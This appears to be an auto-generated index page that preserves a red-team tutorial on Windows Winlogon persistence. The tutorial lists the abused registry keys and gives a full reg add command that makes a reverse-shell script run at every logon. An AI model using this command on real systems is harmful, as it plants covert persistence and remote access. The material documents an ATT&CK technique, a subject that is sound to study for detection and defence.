---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Windows Logon Helper

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-windows-logon-helper` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/windows-logon-helper.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Windows Logon Helper](../../topics/offensive-security/windows-logon-helper.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-persistence-windows-logon-helper |
| name | Windows Logon Helper |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/persistence/windows-logon-helper.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (424).png
- image (425).png
- image (426).png
_body: "# Windows Logon Helper\n\n> Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as\
  \ the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.\n>\n> [https://attack.mitre.org/techniques/T1004/](https://attack.mitre.org/techniques/T1004/)\n\
  \nCommonly abused Winlogon registry keys and value for persistence are:\n\n```\nHKCU\\Software\\Microsoft\\Windows NT\\\
  CurrentVersion\\Winlogon\\Userinit\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify \nHKCU\\Software\\\
  Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\shell\n```\n\n{% hint style=\"info\" %}\nHKCU can also be replaced with\
  \ HKLM for a system wide persistence, if you have admin privileges.\n{% endhint %}\n\n## Execution\n\nLet's run through\
  \ the techqnique abusing the `userinit` subkey.\n\nLet's see what's currently held at the `userinit`:\n\n```\nreg query\
  \ \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v userinit\n```\n\n![](<../../.gitbook/assets/image\
  \ (424).png>)\n\nLet's now add an additional item shell.cmd (a simple reverse netcat shell) to the list that we want to\
  \ be launched when the compromised machine reboots:\n\n```\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\\
  CurrentVersion\\Winlogon\" /v userinit /d C:\\Windows\\system32\\userinit.exe,C:\\tools\\shell.cmd /t reg_sz /f\n```\n\n\
  ![](<../../.gitbook/assets/image (425).png>)\n\nRebooting the compromised system executes the c:\\tools\\shell.cmd, which\
  \ in turn establishes a reverse shell to the attacking system:\n\n![](<../../.gitbook/assets/image (426).png>)\n\n## References\n\
  \n{% embed url=\"https://attack.mitre.org/techniques/T1004/\" %}"
_relative_path: offensive-security/persistence/windows-logon-helper.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/windows-logon-helper.md
````
